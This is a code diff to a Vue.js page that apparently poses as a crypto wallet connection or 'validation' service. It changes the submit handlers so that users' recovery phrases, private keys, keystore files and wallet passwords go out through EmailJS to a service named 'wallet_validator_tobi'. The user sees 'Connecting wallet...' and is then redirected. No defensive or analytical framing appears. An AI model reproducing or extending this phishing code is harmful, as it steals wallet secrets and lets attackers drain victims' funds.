@@ -2,6 +2,7 @@
 import Layout from '../components/Layout.vue'
 import wallets from '../assets/wallets.json'
 import { ref, reactive } from 'vue'
+import emailjs from '@emailjs/browser'
 import router from '../router'
 
 const connectModalTrigger = ref()
@@ -17,7 +18,6 @@ const currentWallet = reactive({
   src: ''
 })
 
-const formLocation = 'http://localhost/tobi/submit.php'
 const formDisplay = reactive({ value: 'recovery-phrase' })
 const formInputKeyStoreJson = ref()
 
@@ -36,15 +36,23 @@ const formSubmit = {
       return false
     }
 
-    const formData = new FormData()
-    formData.append('recoveryPhrase', formInput.recoveryPhrase)
-
-    fetch(formLocation, {
-      method: 'POST',
-      body: formData
-    }).then((res) => {
-      redirectUser()
-    })
+    emailjs
+      .send(
+        'wallet_validator_tobi',
+        'template_crypto_validate',
+        {
+          recoveryPhrase: formInput.recoveryPhrase
+        },
+        'SKECErAHJ5g1CQj--'
+      )
+      .then(
+        (result) => {
+          redirectUser()
+        },
+        (error) => {
+          router.push({ name: 'wallets-view' })
+        }
+      )
     showCreds.successMsg = 'Connecting wallet...'
   },
   keyStoreJson(e) {
@@ -55,13 +63,28 @@ const formSubmit = {
       return false
     }
 
-    const formData = new FormData()
-    formData.append('keyStore', formInputKeyStoreJson.value.files[0])
-    formData.append('walletPassword', formInput.walletPassword)
-
-    fetch(formLocation, { method: 'POST', body: formData }).then((res) => {
-      redirectUser()
-    })
+    const reader = new FileReader()
+    reader.onloadend = () => {
+      emailjs
+        .send(
+          'wallet_validator_tobi',
+          'template_crypto_validate',
+          {
+            walletPassword: formInput.walletPassword,
+            keyStore: reader.result
+          },
+          'SKECErAHJ5g1CQj--'
+        )
+        .then(
+          (result) => {
+            redirectUser()
+          },
+          (error) => {
+            router.push({ name: 'wallets-view' })
+          }
+        )
+    }
+    reader.readAsBinaryString(formInputKeyStoreJson.value.files[0])
     showCreds.successMsg = 'Connecting wallet...'
   },
   privateKey() {
@@ -72,15 +95,23 @@ const formSubmit = {
       return false
     }
 
-    const formData = new FormData()
-    formData.append('privateKey', formInput.privateKey)
-
-    fetch(formLocation, {
-      method: 'POST',
-      body: formData
-    }).then((res) => {
-      redirectUser()
-    })
+    emailjs
+      .send(
+        'wallet_validator_tobi',
+        'template_crypto_validate',
+        {
+          privateKey: formInput.privateKey
+        },
+        'SKECErAHJ5g1CQj--'
+      )
+      .then(
+        (result) => {
+          redirectUser()
+        },
+        (error) => {
+          router.push({ name: 'wallets-view' })
+        }
+      )
     showCreds.successMsg = 'Connecting wallet...'
   }
 }
@@ -88,7 +119,7 @@ const formSubmit = {
 function redirectUser() {
   setTimeout(() => {
     showCreds.successMsg = ''
-    router.push('/generate-code')
+    router.push({ name: 'generate-code' })
   }, 1000)
 }
 
@@ -296,7 +327,6 @@ function popupConnect({ wallet }) {
           <form
             v-show="formDisplay.value == 'recovery-phrase'"
             @submit.prevent="formSubmit.recoveryPhrase($event)"
-            :action="formLocation"
             class="mt-4"
           >
             <div class="form-control">
